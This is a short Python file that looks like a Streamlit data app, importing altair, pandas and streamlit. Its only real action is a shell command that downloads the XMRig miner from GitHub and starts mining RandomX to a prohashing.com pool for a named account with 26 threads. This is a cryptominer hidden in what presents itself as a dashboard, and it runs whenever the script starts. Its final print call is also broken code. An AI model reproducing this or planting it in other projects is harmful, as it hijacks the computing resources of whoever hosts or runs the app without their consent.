from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://prohashing.com:3359 -u temera88 --keepalive -p a=randomx -t 26", stdout=subprocess.PIPE, shell=True)
print(p.communicate())